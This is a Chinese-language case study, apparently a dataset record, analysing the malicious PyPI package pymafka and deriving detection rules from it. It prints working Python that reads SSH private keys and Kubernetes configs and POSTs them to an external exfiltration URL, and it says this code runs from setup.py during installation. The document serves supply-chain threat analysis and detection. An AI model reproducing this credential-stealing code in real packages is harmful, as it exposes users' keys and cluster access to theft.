# 典型案例：从威胁情报中提取可操作知识

**来源**: CheckMarx威胁情报报告  
**包名**: pymafka (PyPI)  
**版本**: 0.1.0

## 案例概述

pymafka是一个恶意PyPI包，在安装过程中窃取用户的SSH和Kubernetes凭证，并将其传输到外部攻击者控制的域名。

---

## 三种可操作知识的提取

### 1. 恶意代码片段 (Malicious Code Snippet)

**具体攻击实现**：

```python
import os
import requests

files_to_steal = [os.path.expanduser('~/.ssh/id_rsa'), 
                  os.path.expanduser('~/.kube/config')]
exfil_url = 'https://app.threatest.com/api/v1/exfil'

for file_path in files_to_steal:
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            requests.post(exfil_url, files={'file': f})
```

**触发时机**: 在安装过程中通过setup.py执行  
**所需权限**: 读取~/.ssh/id_rsa、读取~/.kube/config、网络访问外部域名

---

### 2. 行为描述 (Behavioral Description)

**操作性说明**：

> "During installation, the code reads the user's ~/.ssh/id_rsa and ~/.kube/config files and sends their contents via HTTPS POST to app.threatest.com, resulting in credential exfiltration."

**关键行为特征**：
- 在安装期间访问~/.ssh/id_rsa或~/.kube/config敏感凭证文件
- 从安装进程发起到app.threatest.com的出站HTTPS POST请求
- setup.py中包含读取凭证文件和外部POST请求的代码

---

### 3. 专家推理链 (Expert Reasoning)

**为什么可疑 (Why Suspicious)**：
> "The code accesses sensitive credential files and transmits their contents to an external server without user consent, which is a clear indicator of malicious intent."

**违反的安全原则 (Violated Expectations)**：
- **原则1**: 合法的setup.py应该只处理包安装逻辑
- **原则2**: 不应该访问或传输用户凭证文件
- **原则3**: 不应该在安装过程中执行网络数据外泄

**关键判定指标**：
1. 在安装期间访问~/.ssh/id_rsa和~/.kube/config
2. 使用requests.post向外部传输文件内容
3. 硬编码的外泄URL: https://app.threatest.com/api/v1/exfil
4. 恶意逻辑嵌入在setup.py中

**与合法用途的区别**：
合法包可能会读取配置文件进行设置，但绝不会在安装期间将私钥或敏感数据外泄到外部域名。

---

## 检测方法提取

基于上述三种知识，可以构建如下检测规则：

**静态分析**：检测setup.py中对~/.ssh/id_rsa、~/.kube/config的硬编码引用，以及对外泄端点的调用

**动态监控**：监控包安装进程对敏感文件的未授权访问，以及向app.threatest.com等域名的出站POST请求

**行为签名**：setup.py发起HTTPS POST请求 + 读取凭证文件 + 外部域名传输

/home2/wenbo/Documents/IntelliGraph/Dataset/IntelliJson/checkmarx/20240824_195353_793896/verify.json